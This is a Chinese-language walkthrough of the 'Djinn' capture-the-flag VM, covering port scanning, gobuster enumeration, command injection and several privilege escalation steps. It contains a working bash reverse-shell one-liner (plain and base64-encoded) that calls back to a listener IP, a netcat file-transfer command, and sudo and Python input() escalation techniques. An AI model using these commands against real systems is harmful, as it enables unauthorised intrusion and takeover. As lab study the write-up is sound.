# Djinn  
## 简述  
对网站目录进行爆破。发现页面存在代码执行，利用之后拿取一个低级的权限，提权通过其他的用户执行相关的命令进行提权。最后存在一个python的input漏洞利用漏洞进行提权  
## 发现  
对端口进行扫描以后记得要全面   
nmap  -p 1-65535 -sS ip  
发现开启了一个7331 端口，其中存在一个页面  

直接使用gobuster对页面进行寻找子目录  
```
 gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://192.168.1.59:7331
```  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200116220405.png) 
得到页面之后发现wish页面存在注入  
注入经过base64的命令  
```
bash -i >& /dev/tcp/192.168.43.39/1234 0>&1  | base64 -d| bash  
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMzkvMTIzNCAwPiYx| base64 -d| bash  
```  
之后反弹shell  

## 提权  
如何进行提权？ 
拿到shell第一步，获得一个交互式的shell  
```
python -c 'import pty;pty.spawn("/bin/bash")'  
```
翻看其中的文件
在/home/nitish/.dev/拿到nitish的密码   
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200116220333.png)
登录之后输入 sudo -l 查看可以执行的命令  
提示使用genie这个命令  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200116203100.png)
翻看了man文档之后构造命令  
```
sudo -u sam /usr/bin/genie -cmd 命令  
意思是使用sam这个角色登录执行/usr/bin/genie 这个命令 其中-cmd是genie的参数  
```  
直接拿到了sam的权限
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200116203609.png)    
然后继续查看sudo -l 
发现可以使用/root/lago  
查看其中的文件 发现一个隐藏文件 /home/sam/.pyc 使用反编译   
nc传输文件的方法 cat filename | nc ip port 
发现就是lago文件的编译   
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200116210153.png)  
对代码进行分析 存在input漏洞  
https://blog.51cto.com/12332766/2299894
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200116220244.png)
直接进行利用拿到root权限
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200116220222.png)
### 总结  
目录扫描哪家好 还是gobuster最巧妙  
拿到普通shell之后第一件事是转换为交互式shell  
要翻里面的文件 一般存在奸情  
要看特殊的命令会有特殊的收货  
